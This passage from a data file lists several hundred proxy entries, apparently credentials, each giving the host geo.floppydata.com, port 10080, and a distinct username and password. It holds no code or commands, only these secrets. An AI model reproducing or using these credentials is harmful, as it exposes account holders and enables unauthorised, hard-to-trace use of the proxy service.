    "geo.floppydata.com:10080:Vz8Vb7Id06O6sDFd:kfbElmH16FO0gEOs",
    "geo.floppydata.com:10080:rDHHo5DOKHhUuRG0:GHsUySbrmFAYVnNM",
    "geo.floppydata.com:10080:J3uXl0U0X8mpFoEY:ZRplLjy9qFgu8X8f",
    "geo.floppydata.com:10080:dm7J4C3YY5ctK4fZ:Pygajro6uUsSDpZN",
    "geo.floppydata.com:10080:XCIvz34kr6z6ZwDy:ZIuWuFl29H8a7v0u",
    "geo.floppydata.com:10080:t6WQtVrDUn5lHA27:VVhiEtUaitQYQAW7",
    "geo.floppydata.com:10080:N9SAN8udA8BMevss:BL2jUoUpKlkkHSv1",
    "geo.floppydata.com:10080:VsmQNEMfZO4LlT4a:BKdVbzVmna7qeei8",
    "geo.floppydata.com:10080:bqgCHn9HkJolmsg2:SXzx4QIcogmVMglz",
    "geo.floppydata.com:10080:JLLQ6rgXwXSZdQV9:44mo9Y4inMdSPsoz",
    "geo.floppydata.com:10080:1ZYxC8gQ9SmGWkJ3:egVcNkhRvVFo8gkT",
    "geo.floppydata.com:10080:azRt0Q36IadtEh8p:7z62NuHmRIPkIdnM",
    "geo.floppydata.com:10080:yFHIkyQ1lILB0Mp9:2UYsrKeb2LvKElkh",
    "geo.floppydata.com:10080:GdbtSWImOv23xYZF:8x2u50ek8fKena5X",
    "geo.floppydata.com:10080:SwFmNlPoXtGpzVYU:sdfn4sDWucwftRFS",
    "geo.floppydata.com:10080:3LYCgj7ub8JbLsZO:dbsEpsfzAaqZKf0O",
    "geo.floppydata.com:10080:VpujiGTeH06FL16I:YA0gZlHucQuEURHp",
    "geo.floppydata.com:10080:U5S1ZCeNJGGulUfR:AqY22LxfnBFouL01",
    "geo.floppydata.com:10080:BIZezAykSjXBnGZE:ZdXYz8mGRL0On2vz",
    "geo.floppydata.com:10080:66Vq8ejfD0nvYKAu:D5WS3iM6pI87LnDp",
    "geo.floppydata.com:10080:yXuIgvGIC9b4gUiO:LSv9ggTPDrRbQYgh",
    "geo.floppydata.com:10080:W9EROK2yJwhqv7XX:kLMivukiI2Iqlqin",
    "geo.floppydata.com:10080:ULCKJisFFfCRvqfC:K0zcfy1VHjGlBV2D",
    "geo.floppydata.com:10080:berlRLmP3cH2j2jL:skpU9Qbe7sfJSxNs",
    "geo.floppydata.com:10080:biFGsThxANrSesID:P6D0WpwJP9OGqlpF",
    "geo.floppydata.com:10080:oEIMosOoi6tSM3wS:17n5kXtIHyc58CxF",
    "geo.floppydata.com:10080:VFkiONFQtH2BHIln:OTFhyhxKeqtYc9oX",
    "geo.floppydata.com:10080:0QhOrz5kEOGsLfKg:qUhIewgtSBuqvJBx",
    "geo.floppydata.com:10080:RnnmQM9Nzd6d7xSh:cpE9WKuwaBCNAubi",
    "geo.floppydata.com:10080:ev0URJ0ZQ7eHa5T2:oguJ7CGF0j2tOEMe",
    "geo.floppydata.com:10080:GMHjBLOAC7LNnTek:gX7pogkV7EIWnbkA",
    "geo.floppydata.com:10080:t2AjaVpMWl79R3P9:PayJQcPvu4qo5tHd",
    "geo.floppydata.com:10080:pJJTfud3CK2DNwXm:YJ4kwY0R8apXCnPz",
    "geo.floppydata.com:10080:bjc7j2zkEKZM4Kqu:OrX9Bmd0TFAwXRHr",
    "geo.floppydata.com:10080:yz9J6qo9UsR6vWAa:K2EM3tZ0jxAo0eV4",
    "geo.floppydata.com:10080:xRdiJGvYKErZhasW:FtrTsFZ2o4AMkpGs",
    "geo.floppydata.com:10080:BK5PqXlMO68Uob0k:WDOKcTEUhTiqVp4A",
    "geo.floppydata.com:10080:PRj8n19h9rRZmNnC:4RnxmFRAfGbRdN3U",
    "geo.floppydata.com:10080:u1kakKTSsunHQTIv:2pPjklpC2Y6oJmMO",
    "geo.floppydata.com:10080:0Xvu5MGFf4TPDTt8:ufVud1CB1SMmdD2d",
    "geo.floppydata.com:10080:lZsGjNU0a5l9Q0fh:iEj9YKDcGSKF8rIr",
    "geo.floppydata.com:10080:WN9F0BVjmvoyI3Y2:eXhjlb1qDgUCLV8L",
    "geo.floppydata.com:10080:45hyPf4DqSlhIRjH:mfGw81wSnmjMiGho",
    "geo.floppydata.com:10080:KFMdn9VHNnMilpqX:E0vHzuCKcgtgwjs1",
    "geo.floppydata.com:10080:akKRrmzFgYbaaj6d:qgYYZLttodh4pn1R",
    "geo.floppydata.com:10080:2scv2z9i57lUVHsy:nuV1bqprbiAP501I",
    "geo.floppydata.com:10080:sEeElAKv3ZQp7nyo:wj6NmdBXpqq2BZZz",
    "geo.floppydata.com:10080:HCv14RoGiW4YCY2C:f9iqulMtdEFLazCx",
    "geo.floppydata.com:10080:19OIsdw81DXkVHCn:pje81sEzA6UMO2u0",
    "geo.floppydata.com:10080:D8raimgp55gEZxHk:ekxhXwJ2ZCLEtSw4",
    "geo.floppydata.com:10080:pLhNCZTFDYOUCahf:MOTGruUrBReSdvwF",
    "geo.floppydata.com:10080:RSjrpqVhWDtpMIdD:d4JNdD3DWEz9fjto",
    "geo.floppydata.com:10080:P9As8CsZGRVWyhnb:4NBq9fODECYFxolq",
    "geo.floppydata.com:10080:Y16QVFJqH9cGbHI7:bUfuwdNgLzdjlN7Y",
    "geo.floppydata.com:10080:USCa9lNQ4PwwpgPy:onljcuXxRSLDrozB",
    "geo.floppydata.com:10080:KbFoUIxJsqJkUnhc:Yi2ibOylE2BHHWAr",
    "geo.floppydata.com:10080:Dcy4CQPBn2aaYSGg:q94JFS9P8v0tuj7u",
    "geo.floppydata.com:10080:0VPiB0PFSQoyQjT8:wuxnLwhZT1yaeRaO",
    "geo.floppydata.com:10080:LExLQn10hCoArnNV:HOTO9J4JRJP422sJ",
    "geo.floppydata.com:10080:MxhBmzAhdGJI6DcC:PALZmplC614rmblf",
    "geo.floppydata.com:10080:B6DpoG8DDTAweUS7:tHLcqB0Yzf1nGv2q",
    "geo.floppydata.com:10080:JdnJKEsFi88ocK04:j659v2ZLkX8BB73S",
    "geo.floppydata.com:10080:CLq5SIJjSCG7x9t3:UvYpVmXAnpIJ14wG",
    "geo.floppydata.com:10080:LZGJ9m7YSgh78XVZ:VnNS3pwHDpayyc4I",
    "geo.floppydata.com:10080:5DgKyuqfmYyHN8Zl:QfanBWiJlvlyJAIq",
    "geo.floppydata.com:10080:zjp7EpGJajmyvT1R:MSxTwFuHFnsHvgmr",
    "geo.floppydata.com:10080:QnIJliD4ptFkDIgC:ezxgD1z7PTglGGkR",
    "geo.floppydata.com:10080:HNzyQVHEB1rUPGib:Ryaj4WPUxoBdXB9q",
    "geo.floppydata.com:10080:7BDPLbshf2QieLeC:j6j14bLWWzfsI66H",
    "geo.floppydata.com:10080:Upg8z1PDZlbkwfpg:n0lrKxhm0NPbTS7T",
    "geo.floppydata.com:10080:cFSa3FnJVEd8Emby:NFK9JdJhT73HaJTq",
    "geo.floppydata.com:10080:G7M93RDmRNG7Gf0Q:ZDUE5T4PAxCVR774",
    "geo.floppydata.com:10080:c8WV1rrRoDpTX2JU:icoq0RAOpCIxS0wy",
    "geo.floppydata.com:10080:zIAU0gVAJHMfvjaT:nruRJTw3zbTiBFO8",
    "geo.floppydata.com:10080:xjOHa9kC14sAkaXJ:mtwSlhJbx61L1YCb",
    "geo.floppydata.com:10080:wDOs0WiNqMZvxTnC:Z3IFeIbc8hly22Dq",
    "geo.floppydata.com:10080:WHdjtdhcZSjZ3pPL:c3TA8fBJc1RvUeZm",
    "geo.floppydata.com:10080:3Jwy43JGhokrcQYS:UnieVOezLy39iuY4",
    "geo.floppydata.com:10080:w6AsRvGLdHdOwYtE:iId6V44lKNTeiWfb",
    "geo.floppydata.com:10080:qi5fYjDkaV9UdXzj:XXH7nKMBKP7Sp6lP",
    "geo.floppydata.com:10080:NxdfotkP8Q47TVfT:6haQaEDoCFuwAoma",
    "geo.floppydata.com:10080:ykDvzWo1d0N1dSmu:QhuuBVnzOzdPWtwO",
    "geo.floppydata.com:10080:tdpkD0rWWS960nYl:OkSmA2mYMs0DtU3S",
    "geo.floppydata.com:10080:Woaq1SzIsWGb3Ssi:QbDG0tUeu9GYN7rI",
    "geo.floppydata.com:10080:r1hz8tnJFENpFzsl:Jul0ZiOEzYBSKZrz",
    "geo.floppydata.com:10080:2u53TQtVUkGb3uaU:hFq3ZWBWIO2jfVGW",
    "geo.floppydata.com:10080:1It1SbHSXmIAtzLk:3wieaKLC1YnDPynD",
    "geo.floppydata.com:10080:DKobGoA5EUGAEI54:w3OhwPYi94RKuczH",
    "geo.floppydata.com:10080:JD0yWfXtCwZOWfJL:ZQFuHwMbrMAA48PV",
    "geo.floppydata.com:10080:19ocG1SXcL3bbuqV:kzegkG3L88ntU3Hq",
    "geo.floppydata.com:10080:Xd4yP4j8Y1X5YQaH:tRFXxsBf2fuHRg6p",
    "geo.floppydata.com:10080:d2EnaHg2l2zOWhAH:2navFuu0MeHhAmBL",
    "geo.floppydata.com:10080:uvDVQWTjNUW0mxZW:V9J5UPZOPcKPAl9q",
    "geo.floppydata.com:10080:AfcChRlHwzTLtNy3:oaq2ANGb3iKhINpl",
    "geo.floppydata.com:10080:3cGcrFrTJjq76Wv0:5O627sYeEAyU7WG6",
    "geo.floppydata.com:10080:y9N51ret59BdCNtE:S9O36YlniaCMQEOe",
    "geo.floppydata.com:10080:0aXsM4C0z1HlN7YO:wcjBcsgrz72HCKiH",
    "geo.floppydata.com:10080:PFP3bBXMBm7gxRHJ:q1sqvuQQq5aY4icV",
    "geo.floppydata.com:10080:mtuqBU7L8yPfKgZN:q2sDZgkc89GlZGER",
    "geo.floppydata.com:10080:1q1BqTpwuLQE6vxX:LMdCV5GXqiDl9AqX",
    "geo.floppydata.com:10080:EbRigSF9QY8ttemv:x37NcY0PT9tlhFJI",
    "geo.floppydata.com:10080:NylpAGucyODVyucU:Ifsxbv7qvrYWJ29k",
    "geo.floppydata.com:10080:HC95MtU3UzJRNnnL:7QNG6jqYQFxXgc0F",
    "geo.floppydata.com:10080:cZAQ1GfelhvwkKJp:VcYi58FU1wBnGfsm",
    "geo.floppydata.com:10080:C0zmICYtj6HJmZ4i:B3WjWpc31NSAzUNf",
    "geo.floppydata.com:10080:dUBbfdLUHald2z5F:iR3GjJuZJB3IKSwM",
    "geo.floppydata.com:10080:1wUpU7xUbiuyfUDL:ysXURt2Ulg0Opi31",
    "geo.floppydata.com:10080:5ANB9M6HgjQXqgW8:oCTVIXk3MIEQckmH",
    "geo.floppydata.com:10080:ghOrsz2PRybGYr8N:EoOlCUMESAONhOlP",
    "geo.floppydata.com:10080:rcSkTlb2vfHeba3f:IGDpuOzWakGLgtiT",
    "geo.floppydata.com:10080:SzEbV2bZLJ7OCJzb:UHsRrCpcmvMDrpcv",
    "geo.floppydata.com:10080:qmr5pOg29LaSAvLo:H5yn63ZkF2DVYwkc",
    "geo.floppydata.com:10080:kfFpcCWrcejYd3ph:aholzqjF4nv1Ay7y",
    "geo.floppydata.com:10080:qD0944xo39GHf2nN:2wJbTs2YOWfGyZF8",
    "geo.floppydata.com:10080:Fufj6ZbOysmEMQK6:OP8WYweoIo5fvZlM",
    "geo.floppydata.com:10080:Uxt05ViRvkLgAoOx:QF99JiDpBZl8iuJC",
    "geo.floppydata.com:10080:Hwa6u0IhwZNhxYMO:F1iLK0JhjbueIwiY",
    "geo.floppydata.com:10080:NLvgutrSul14HzHO:PFAVKv2bVsiMNrdx",
    "geo.floppydata.com:10080:hTkWIyVZXmkFMfKH:y7WUmF2Pgwwn0Mik",
    "geo.floppydata.com:10080:puxxUS47HC6CugHx:UgkRMAgBytu3oTXy",
    "geo.floppydata.com:10080:fivHta6hr681cU6y:ttODlzGK0yI0lidv",
    "geo.floppydata.com:10080:l1wyfNadE6xMLMNh:ROu8BacnXj8Rm2m7",
    "geo.floppydata.com:10080:LaEvpdrc9PfFKdYc:k5qejVKX5qRsP5Yr",
    "geo.floppydata.com:10080:jUgR4zhFdofHGh3G:W6tAcWMZSrqk7FaF",
    "geo.floppydata.com:10080:w6No5QoWqVu6j4Ca:xJMBTmIDTAHKDLtd",
    "geo.floppydata.com:10080:TxkxaA89IN4tppyQ:3DDrDyYsMenu6t9Q",
    "geo.floppydata.com:10080:knXsDNABMw6tgCOe:DDck9mXyHz5SlHKz",
    "geo.floppydata.com:10080:yIbkt3KD3HqDOhwk:usqbGUNquitZe4tz",
    "geo.floppydata.com:10080:6hz9DSgWtXL5afMC:4qdpbnblB3uHqSbB",
    "geo.floppydata.com:10080:POxU2KeyiG1flss1:31aCjkLlI9KbVFAy",
    "geo.floppydata.com:10080:O99kTxkbinNZgyBW:tP84uKY6a40YqMSz",
    "geo.floppydata.com:10080:eKihWBa4RPmMTc50:oFmRsEBZ7yS1joku",
    "geo.floppydata.com:10080:mcu7kRy35gIW00Ls:MqVTLWb4XFfGL4Lq",
    "geo.floppydata.com:10080:CUb4LejoCckWmwIB:WWKm7vofwV6ZMclF",
    "geo.floppydata.com:10080:0RtVebSgLTvox4vg:MGeq4PzJG4pQtRHN",
    "geo.floppydata.com:10080:juqSzgZI2eKEXyL8:6vaFz86L1G4Ma5z0",
    "geo.floppydata.com:10080:ZVLpZmALdrtT8oeh:iJ1gYUbe4qiINQR0",
    "geo.floppydata.com:10080:GWN5GBTrogPDg8uL:ScDJl0vVEfSuFgsX",
    "geo.floppydata.com:10080:G9DUsu9t1eytlZ1c:qBaGgsdVDbld1bY9",
    "geo.floppydata.com:10080:VVB2vpk8kpUS8Uqe:FsKnxOh3Vylwv4oH",
    "geo.floppydata.com:10080:fdi79oXqfv1hFRqj:qBSBmNpVcFSMIik4",
    "geo.floppydata.com:10080:zZMRYd3heBbutZXU:yj3AKpW7VTEiTOFd",
    "geo.floppydata.com:10080:MWLGegVQfJb5kZRs:5CSxZwtWQqh79yrT",
    "geo.floppydata.com:10080:atMUKE8CksHe4qMI:k2wapCCiSDwO7E4u",
    "geo.floppydata.com:10080:Eghw05jaM2TvUugk:Eyxf2HMEjSrGwAzn",
    "geo.floppydata.com:10080:n5DyXFgYVAyvN9fZ:wxTJhW2Aqcoc4auf",
    "geo.floppydata.com:10080:yBiFhmpwlFsWFmm4:2vgFqIaLCtDOb1pf",
    "geo.floppydata.com:10080:VH2WSOVDVOWfxN0d:nmLaAz5dghbanGT7",
    "geo.floppydata.com:10080:c5RTqfdL22K1NUbf:3USxGdMhEfYYZnFY",
    "geo.floppydata.com:10080:cOQI6stn2S4yIZZn:5TbwzLjyP25K1KBI",
    "geo.floppydata.com:10080:FsnZoLVNaUjdJdzL:LNbZzyOVY2h14B0g",
    "geo.floppydata.com:10080:pYzOrhSsoJqr8Z47:pJCg8XvajN3ubXAg",
    "geo.floppydata.com:10080:52RC7hhGgAtpMj3w:SvL0gBo7JjoA08SA",
    "geo.floppydata.com:10080:ygWpdTIKt10oMuaw:puTYBzikIXtfELCA",
    "geo.floppydata.com:10080:KfAWCdl1SgAAFxnC:UxvIv7eIq7sRBr1q",
    "geo.floppydata.com:10080:h558s4DpbYNzA1a8:vwAzGWvOIlqqTjD7",
    "geo.floppydata.com:10080:c4fyUJ9hX9pU5rps:ziMX5gr3meoJRwiv",
    "geo.floppydata.com:10080:ePu0FkhCfGnG5ZB5:lYdnDLgtHAB8Qfdh",
    "geo.floppydata.com:10080:Hsc3Yfb2Fx6UHBdi:1RfDFfQWteq4ZHfH",
    "geo.floppydata.com:10080:WslPk79HguZz8uYY:Qb4nyG1KQDWqP5A7",
    "geo.floppydata.com:10080:6zzA0CmUrdDk0Q55:1g8WQNGki1uiMbCU",
    "geo.floppydata.com:10080:PRNW47qsVVtItjSv:gW3dbMKjRXHPcMyV",
    "geo.floppydata.com:10080:NSSgih0nMu4O6Lqe:5mw0axQPCrnAbGwm",
    "geo.floppydata.com:10080:gFmwJ5FaLzVpHDrM:1OI2hba9FF4pwZQc",
    "geo.floppydata.com:10080:tMJUXWubBUxp3ZDk:H2UZsMtNnlIUgkZW",
    "geo.floppydata.com:10080:bkWAlVpVWWi0yhQ4:2wHCTlyazNqjZHsi",
    "geo.floppydata.com:10080:LKRJ2VZH0VZuBtf4:WjixtCcidqSefWKR",
    "geo.floppydata.com:10080:stNzXYvVMwRfc3Rl:yKP0ZxgMjSq8FBRm",
    "geo.floppydata.com:10080:md1elDuYcBbkzcov:FCjwGwYG3S6tYsiN",
    "geo.floppydata.com:10080:LWyaZWlRFbPPLUNV:6cLGeKAXLqcLJmlg",
    "geo.floppydata.com:10080:SCAolH9pCJKren9o:sKDAqWRZL2QV9rt9",
    "geo.floppydata.com:10080:Y6DcS7VlLtlNt9Hv:cRl1qEEpkpzSPKgT",
    "geo.floppydata.com:10080:gEEPVCP94TAqYBQ7:INx9YguFwCd9znPx",
    "geo.floppydata.com:10080:Dn5L06KKc7DmWaOs:CouCNKndXMr0A3BI",
    "geo.floppydata.com:10080:1FdqLoz7Z9JlQBC4:cOBNSY1f6vYQM4j6",
    "geo.floppydata.com:10080:LFrwrWoxhE9ciqyJ:qFR22sNsMFMEAkDO",
    "geo.floppydata.com:10080:rz0pNxojvHM7UHfc:bEnpdz7rszMWzWTh",
    "geo.floppydata.com:10080:aHL9Ss2ahMzaSqHc:rWnBXlJWUH2lzf2v",
    "geo.floppydata.com:10080:urx76rFNUmjOypE2:fGFDWAXb9bhwkFoA",
    "geo.floppydata.com:10080:66R2JLztRjcqb3pS:Q0AuhvjRv9lt53qq",
    "geo.floppydata.com:10080:2738Sys52qkRbUai:90doA1OGDGO6w8Pu",
    "geo.floppydata.com:10080:d2KoqGm1EEI40KY4:byOog687wXjq7LA7",
    "geo.floppydata.com:10080:Y6rDhZPThJ74dmId:BDYzTKkofFS3lzcK",
    "geo.floppydata.com:10080:w2dJMpYZf1i7XJ3J:W0beDPOTGOp9PCKS",
    "geo.floppydata.com:10080:i4Em1B3wD6zXRqTU:y8eHsFQZvibuIgCF",
    "geo.floppydata.com:10080:WLSd1RobnXgFNhal:NkChwlodzAvnf16S",
    "geo.floppydata.com:10080:Zmb0cGImYKkUJCCq:zwncWnoMT8VbdDub",
    "geo.floppydata.com:10080:PplGUX6XqJ0IsC6s:ahgUoEiWY63lfdEX",
    "geo.floppydata.com:10080:OLXRguA9Vt7Stbas:i4Kb3widkJ0LFd9f",
    "geo.floppydata.com:10080:3O8kNMejqwfeM7kw:YmaCVMMxUjImnOOb",
    "geo.floppydata.com:10080:hCV25dQ3bI1a7TLR:XAiH6TrglA8x4NRe",
    "geo.floppydata.com:10080:qJvltwJejExbz1ui:WhVLM3ydwqazSNHA",
    "geo.floppydata.com:10080:F9Rteu3pTMuFeDdS:i4z2MQGXShg2Nzvh",
    "geo.floppydata.com:10080:RejvqBoh7j74zkzH:Dx8dezJ3DyabQeVj",
    "geo.floppydata.com:10080:EQEIFUs9llDu6bhk:WcHJGXrEB0oeqvmZ",
    "geo.floppydata.com:10080:4U8uanKGvlvi3bcr:Ww4LAfebdIgh4QPa",
    "geo.floppydata.com:10080:MrBxHmiR0uzBu3b3:JB2Nu7I9bNyZwKOA",
    "geo.floppydata.com:10080:Iz9nQ859Ih9BXoCi:nUGcBOeXnZpWVwYV",
    "geo.floppydata.com:10080:ksNKHhBkYpCtUr9i:V5m7jSBS1aV7EcJD",
    "geo.floppydata.com:10080:y5JImwcuVX1kgaxX:l00JkODfjlvlY0SI",
    "geo.floppydata.com:10080:eD3XCRinLKTJiiVM:WCmENt1ma3vAV1sh",
    "geo.floppydata.com:10080:a5N1jDWUxmIfvmTH:vJMZm6gcjfFbHtRH",
    "geo.floppydata.com:10080:zLvpujvXN1GTRQkF:KcsA2UFH02fCPIOg",
    "geo.floppydata.com:10080:jEiuTHqDfS85LwBZ:BGJY0oasHOPRUjcF",
    "geo.floppydata.com:10080:s5Kd2Td1TNKNxgUM:a0RSB6XpDiESxi8k",
    "geo.floppydata.com:10080:nJetWtlCW7pQqoz5:LrKqGcyl0zjyQaQ9",
    "geo.floppydata.com:10080:mgkAzibW24knNnYC:1lvD1uIs7ika8wAh",
    "geo.floppydata.com:10080:IIWD7PVE06HlMLRd:BUp1rA0Ip8S8q8Jt",
    "geo.floppydata.com:10080:pKP7iHGAd5M5UBV4:lwyEFAZks3jvpwJY",
    "geo.floppydata.com:10080:I4cNYqcQ8Yz41148:zCMMtuJy6UHk9ynl",
    "geo.floppydata.com:10080:aJnw9AOAxc74vSgD:P8vNgglaxbaE1eqg",
    "geo.floppydata.com:10080:SbCuQ0PPQbwnUrIT:Nmyis1AxpMG1FnGj",
    "geo.floppydata.com:10080:be9kCOeU00XJMcbF:slFTbBuIoVxz4Txn",
    "geo.floppydata.com:10080:i2TD3VnjNudkY0CK:q8JTNjphKaiOHORL",
    "geo.floppydata.com:10080:SVXyX5fKh7GUgAUk:A1GmcA70BhLUHqax",
    "geo.floppydata.com:10080:QkLEbRgtfxHckB7f:qh2rJAvZCRlIsAuT",
    "geo.floppydata.com:10080:xPMatbmTOPEJyZC0:CNTbpA1jJTO2u6f2",
    "geo.floppydata.com:10080:K0cPhpZSWUcRLHwH:LfBGs2v0L0mev6KB",
    "geo.floppydata.com:10080:Jhkb7b9MwBygA53Z:muMRg0A0lEbnahiN",
    "geo.floppydata.com:10080:2FfBP4lISHWKDR8D:WlmUzGI6YjeiW8tO",
    "geo.floppydata.com:10080:EFIGcP1BdFGDFVnb:Kpuuglt1AMkRrS8m",
    "geo.floppydata.com:10080:ep1coYUNwQUusnMH:hsqm12LC2VexeEUw",
    "geo.floppydata.com:10080:Z5QMTfQEBWkbwEak:Av2FX0KzHE2aiWnX",
    "geo.floppydata.com:10080:Vt8vOUPin4hRuQWE:3npe1MxVJigeZnZt",
    "geo.floppydata.com:10080:ve9ZZwUJogK0LTP7:brRyxkuaFf5YS7r3",
    "geo.floppydata.com:10080:UzmnvW2X3fNQRmTi:SqTnpY9fPTNKfrLx",
    "geo.floppydata.com:10080:HSKHeqJREmmAuZCX:xamA5djVlh94zsAD",
    "geo.floppydata.com:10080:01cTACg7gPhGNekr:IGcUYeBI8V8Gm6zf",
    "geo.floppydata.com:10080:qssDasKvsBijRaWq:n4YeepHd7y79kOTS",
    "geo.floppydata.com:10080:tJ9GLuckNXAkdl73:mJxICeOCDLbOi4QK",
    "geo.floppydata.com:10080:d31HNu3ucTewaRVy:8h4OTu3yPyOXYXbg",
    "geo.floppydata.com:10080:EmG3fcA7RaUxNcvr:9xFho2MRdT216Fef",
    "geo.floppydata.com:10080:l0UkmQYe4SVjwc9r:Mt5Np78N3Pm5CTYC",
    "geo.floppydata.com:10080:j9RkOFBmKlqtwnxR:6WzFLX9xtkkeZ7g1",
    "geo.floppydata.com:10080:YeDE4hVd68f3oZ2T:Gx77XvDe38seNN7P",
    "geo.floppydata.com:10080:CSy26QAjXtt1Vywg:4lY7ZBJcXcH9RD3G",
    "geo.floppydata.com:10080:kjDjW9NQWZgY2cYz:j2h4pnlQ2VapVjGI",
    "geo.floppydata.com:10080:du3Z1unLb7QM6wbG:LZPS6ihm6Xpvf9KC",
    "geo.floppydata.com:10080:mKVwknO2Zvqr95oa:jr2BivCILrNTgSh8",
    "geo.floppydata.com:10080:AZmIH9EykuZOezkT:N1Qwvj6DM46aDWel",
    "geo.floppydata.com:10080:kiyL55KLfyZSJhn6:7JwzHJBfYILL3ddC",
    "geo.floppydata.com:10080:PK1xeLGeRwY07Owo:C8h6ow19eyWzItwE",
    "geo.floppydata.com:10080:EuAOTdJ9sVghqV4D:0Q6gXq25HONcLKlx",
    "geo.floppydata.com:10080:NqVTGUz1VzHpZ6gS:sJM4nmUIhvfxqYWF",
    "geo.floppydata.com:10080:P738BBlcja1TkjDj:ZzommYKDF71zNcES",
    "geo.floppydata.com:10080:vk9GOqjURqrmVXH7:Tomg4WJ3OV8hZHus",
    "geo.floppydata.com:10080:nb29qC4N8GDYqwdD:Rm1r8lSKNoh7LEfC",
    "geo.floppydata.com:10080:E22fIap87Bvg6xKh:4iGjXg11EC5f9pnn",
    "geo.floppydata.com:10080:mnzsWjvM93pa9mP4:gvM3jbZmyoBrLhOy",
    "geo.floppydata.com:10080:ytVpRqIsNuDO0XNX:hYalbwIPotIDJujZ",
    "geo.floppydata.com:10080:ao481z3jTN6twIyj:6kMVM8LR8km8guGm",
    "geo.floppydata.com:10080:Wt4FXGoz3r8kXhdH:bpcd1M58CUFry2eY",
    "geo.floppydata.com:10080:SnuWWKaPU9ifbkfW:2NSvt4mVIycxCpxc",
    "geo.floppydata.com:10080:4f1FWbZrOTwuhHXv:9LZpNduXstU9ueaa",
    "geo.floppydata.com:10080:zvaLfc5bFY03r8RQ:HHCpoGxCG9jNbAo7",
    "geo.floppydata.com:10080:VxdY2xmEZWzPHIPY:6AW7pG0foHFv0FHN",
    "geo.floppydata.com:10080:WLc29KY2GOUdV7pS:FQwauDcDxGTCEnjD",
    "geo.floppydata.com:10080:VLJFFvjv9PCoHDWX:GcyXvgqZMyA2Ipmp",
    "geo.floppydata.com:10080:eQ2RLi3sxxpaA7Nr:EOneArBXU7QFApgz",
    "geo.floppydata.com:10080:S1X42fPkUQCkc0WG:96v6AQpqr1inKJQf",
    "geo.floppydata.com:10080:63qMlP5jQkKAu5gS:quaVsnKGCcaGT4xw",
    "geo.floppydata.com:10080:TEMBu77ij4kmxcVo:5tzLZg6pcZfKCyDf",
    "geo.floppydata.com:10080:vsHQgpXY1PpJNDFe:8yYpOskE2msdOM8I",
    "geo.floppydata.com:10080:AABLHb81UQx4ANzU:2aQN9LRspN2esHTk",
    "geo.floppydata.com:10080:yRly02IxVh8oS91K:0o89w1KXr9w9SvPt",
    "geo.floppydata.com:10080:k6hfjvpCuosG3pQ9:wx7E5XggyowKZ5BV",
    "geo.floppydata.com:10080:6ROPu4ls6aWvo0JF:5wNPCPsw8KOYGpda",
    "geo.floppydata.com:10080:teaZmeV4llnkt8YK:jyEvvuIL7xzJPI9T",
    "geo.floppydata.com:10080:qvRUKUOcUZoD5hA4:TNlpnsdKavGF2E4u",
    "geo.floppydata.com:10080:morwf32WL2TtiAnT:SMPYxyig2Z7H4oXY",
    "geo.floppydata.com:10080:HG9ihqgVhnc4zEyS:umlqVxcpxNUhCOT2",
    "geo.floppydata.com:10080:jX6wKyScCsyyo2Oj:8vDBEMIwYtP2S9hk",
    "geo.floppydata.com:10080:i1pKSG0BzT0og1eX:4FsgxA62b3cznIJy",
    "geo.floppydata.com:10080:EBnnFSShhfhnPkAG:SVbPquIjjylc5zlc",
    "geo.floppydata.com:10080:QHHI6lkFePBpq6bH:TzJvyvFFTYFEZgk3",
    "geo.floppydata.com:10080:XEjAp4GvS6fNVxGl:Sb8hoZNlr4o9rLG6",
    "geo.floppydata.com:10080:A0JzMvnxhdgk6cGE:EMG6Yrpqlxm3ihNZ",
    "geo.floppydata.com:10080:9AV6GJAniFgf8nKT:u18Yy5qoDxKBl3e3",
    "geo.floppydata.com:10080:jqWx2VDlz6m6KZob:l5by8LIeBEzGKghT",
    "geo.floppydata.com:10080:dynTvhgcFXhVKZwW:NTROvs6onRD8otsA",
    "geo.floppydata.com:10080:9boC74fv4nNQI9th:ZMqIhpxhsvp7k4G7",
    "geo.floppydata.com:10080:HVfKQ94iFphgGhdG:9Du2sICoXblelOi5",
    "geo.floppydata.com:10080:brBjsyLmeO7Ckjs9:pJHj4rRbY0fd8rYX",
    "geo.floppydata.com:10080:J9VDKL1YpKFd2068:z9uvGh9DfhFbucW8",
    "geo.floppydata.com:10080:Lq0MzREYSm96seDj:qHCDpZn1rFFN5J25",
    "geo.floppydata.com:10080:PAtnKO0m6mVFDRgh:rv8wXrT82HrqV391",
    "geo.floppydata.com:10080:KdjGJcGQBHgSwRPE:ofdqMrTfcp61PUM1",
    "geo.floppydata.com:10080:Gr8eFBipGvNQpa31:mkgHYbNeY96XtZy9",
    "geo.floppydata.com:10080:YvC0m9pRXvDTTJtA:9TpTgQrGuXCUmrNi",
    "geo.floppydata.com:10080:cbBo8Cue67iJAqpJ:0dnr1x2gWfbLRbcS",
    "geo.floppydata.com:10080:n0waSfTiiZBXYzqU:OYhwE1cfEpcYZrYN",
    "geo.floppydata.com:10080:F7clD4ik9DPBupO2:zmKY2aCtyTP68mcq",
    "geo.floppydata.com:10080:qZgpByFjE4jNgXAP:KPKPmvdwiKjnBIVe",
    "geo.floppydata.com:10080:0nWJtoY3WgUIZZJv:tKnYBTU1V541j7X6",
    "geo.floppydata.com:10080:kXbNWD6HNlKTxbcz:Qh01NEaLw36m67lu",
    "geo.floppydata.com:10080:gPram3zNYr2EfgnN:d8J28caTQfrbt32M",
    "geo.floppydata.com:10080:k9NT4g0LtoPNpXIK:C6b5S2QSdQ5CWxjm",
    "geo.floppydata.com:10080:iuYBmIpu3AFyQkF5:KLN4REROPjpiKEV9",
    "geo.floppydata.com:10080:6Ez8Ig0mzKD0Xuui:cYAjF8aRJbIsTaNc",
    "geo.floppydata.com:10080:OG5Y9qlk3DRL5nih:tmWq2WZax0t2PdLk",
    "geo.floppydata.com:10080:9wXGVRJH9SJaftzS:p7t1JkspQOvN24I3",
    "geo.floppydata.com:10080:fZrKL78JbDzBgxEZ:f0763REEfT03n6so",
    "geo.floppydata.com:10080:0jRKGGMMIZilFJIU:STNg7hGLfo5kJJn7",
    "geo.floppydata.com:10080:Vhi240wAM2JSFLbi:Wh3CnCnXtUxNhyR7",
    "geo.floppydata.com:10080:Vvc6JFYNRDcHfaud:ltVWOMF53VQrK23J",
    "geo.floppydata.com:10080:Z3aVBQD9FKXy9MR9:layqu1mOXtDztzZt",
    "geo.floppydata.com:10080:9O4KND83OQA17LG2:U0XQRxxMMF0NSbQ5",
    "geo.floppydata.com:10080:XJTsBBfbWZ6Vd1UL:nrqwf23o02Z9Cw6F",
